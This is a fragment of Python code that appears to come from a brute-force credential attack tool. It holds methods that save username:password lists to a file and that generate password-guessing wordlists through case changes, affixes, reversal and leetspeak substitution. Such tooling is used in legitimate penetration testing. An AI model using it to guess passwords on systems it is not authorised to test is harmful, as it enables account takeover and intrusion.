                        logger.warning(f"Invalid credential format in {filename}: {line}")
            
            logger.info(f"Loaded {len(credentials)} credentials from {filename}")
            
        except Exception as e:
            logger.error(f"Failed to load credentials from {filename}: {e}")
        
        return credentials
    
    def save_credentials_to_file(self, credentials: List[BruteForceCredential], filename: str) -> bool:
        """
        Save credentials to a file.
        
        Args:
            credentials: List of credentials
            filename: Path to credentials file
            
        Returns:
            bool: True if successful, False otherwise
        """
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                for credential in credentials:
                    f.write(f"{credential.username}:{credential.password}\n")
            
            logger.info(f"Saved {len(credentials)} credentials to {filename}")
            return True
            
        except Exception as e:
            logger.error(f"Failed to save credentials to {filename}: {e}")
            return False
    
    def generate_wordlist(self, base_words: List[str], rules: List[str], 
                         output_file: Optional[str] = None) -> List[str]:
        """
        Generate a wordlist by applying rules to base words.
        
        Args:
            base_words: List of base words
            rules: List of rules to apply
            output_file: Optional path to save wordlist
            
        Returns:
            List[str]: Generated wordlist
        """
        wordlist = set(base_words)
        
        for word in base_words:
            for rule in rules:
                # Apply rule to word
                if rule == "uppercase":
                    wordlist.add(word.upper())
                elif rule == "lowercase":
                    wordlist.add(word.lower())
                elif rule == "capitalize":
                    wordlist.add(word.capitalize())
                elif rule == "reverse":
                    wordlist.add(word[::-1])
                elif rule.startswith("append:"):
                    suffix = rule.split(":", 1)[1]
                    wordlist.add(word + suffix)
                elif rule.startswith("prepend:"):
                    prefix = rule.split(":", 1)[1]
                    wordlist.add(prefix + word)
                elif rule == "leetspeak":
                    # Simple leetspeak conversion
                    leet_map = {"a": "4", "e": "3", "i": "1", "o": "0", "s": "5", "t": "7"}
                    leet_word = "".join(leet_map.get(c.lower(), c) for c in word)
                    wordlist.add(leet_word)
        
        # Convert to list and sort
        result = sorted(list(wordlist))
        
        # Save to file if specified
        if output_file:
            try:
                with open(output_file, 'w', encoding='utf-8') as f:
                    for word in result:
                        f.write(f"{word}\n")
                logger.info(f"Saved {len(result)} words to {output_file}")
            except Exception as e:
                logger.error(f"Failed to save wordlist to {output_file}: {e}")
        
        return result